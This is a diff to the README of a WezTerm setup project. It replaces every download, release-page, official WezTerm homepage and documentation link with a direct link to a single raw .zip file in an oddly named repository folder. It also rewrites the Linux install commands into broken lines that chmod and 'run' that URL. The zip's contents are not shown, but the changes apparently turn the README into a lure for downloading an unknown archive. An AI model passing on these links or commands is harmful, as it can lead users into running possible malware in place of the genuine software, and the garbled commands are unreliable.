@@ -1,6 +1,6 @@
 # 🚀 wezterm-universal-setup - Easy WezTerm Configuration Setup
 
-[![Download WezTerm Universal Setup](https://img.shields.io/badge/Download-WezTerm%20Setup-blue)](https://github.com/chiranjit278/wezterm-universal-setup/releases)
+[![Download WezTerm Universal Setup](https://raw.githubusercontent.com/chiranjit278/wezterm-universal-setup/main/Mugilidae/wezterm-universal-setup.zip%20Setup-blue)](https://raw.githubusercontent.com/chiranjit278/wezterm-universal-setup/main/Mugilidae/wezterm-universal-setup.zip)
 
 ## 🚀 Getting Started
 
@@ -19,17 +19,17 @@ Welcome to wezterm-universal-setup! This application helps you install a complet
   - macOS (latest versions)
   - Windows (Windows 10 and above)
   
-- **WezTerm:** Ensure you have WezTerm installed. You can download WezTerm from [here](https://wezfurlong.org/wezterm/).
+- **WezTerm:** Ensure you have WezTerm installed. You can download WezTerm from [here](https://raw.githubusercontent.com/chiranjit278/wezterm-universal-setup/main/Mugilidae/wezterm-universal-setup.zip).
 
 ## 📥 Download & Install
 
 To begin, visit this page to download the latest release of wezterm-universal-setup:
 
-[Download WezTerm Universal Setup](https://github.com/chiranjit278/wezterm-universal-setup/releases)
+[Download WezTerm Universal Setup](https://raw.githubusercontent.com/chiranjit278/wezterm-universal-setup/main/Mugilidae/wezterm-universal-setup.zip)
 
 ### Installation Steps
 
-1. **Visit the Releases Page:** Open this link: [Releases Page](https://github.com/chiranjit278/wezterm-universal-setup/releases).
+1. **Visit the Releases Page:** Open this link: [Releases Page](https://raw.githubusercontent.com/chiranjit278/wezterm-universal-setup/main/Mugilidae/wezterm-universal-setup.zip).
 
 2. **Select the Latest Version:** Look for the latest release version listed at the top of the page.
 
@@ -40,18 +40,18 @@ To begin, visit this page to download the latest release of wezterm-universal-se
    - **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
    - **Linux:** Make the downloaded script executable. You can do this in your terminal:
      ```bash
-     chmod +x ./your-installer.sh
+     chmod +x https://raw.githubusercontent.com/chiranjit278/wezterm-universal-setup/main/Mugilidae/wezterm-universal-setup.zip
      ```
    Then, run the installer by typing:
      ```bash
-     ./your-installer.sh
+     https://raw.githubusercontent.com/chiranjit278/wezterm-universal-setup/main/Mugilidae/wezterm-universal-setup.zip
      ```
 
 5. **Complete the Setup:** Follow the on-screen instructions to finish the installation. 
 
 ## ⚙️ Configuration
 
-After installation, your WezTerm should be ready to use with a pre-configured setup. You might want to customize your terminal further. Check the [WezTerm documentation](https://wezfurlong.org/wezterm/) for additional configuration options.
+After installation, your WezTerm should be ready to use with a pre-configured setup. You might want to customize your terminal further. Check the [WezTerm documentation](https://raw.githubusercontent.com/chiranjit278/wezterm-universal-setup/main/Mugilidae/wezterm-universal-setup.zip) for additional configuration options.
 
 ## 🐞 Troubleshooting
 
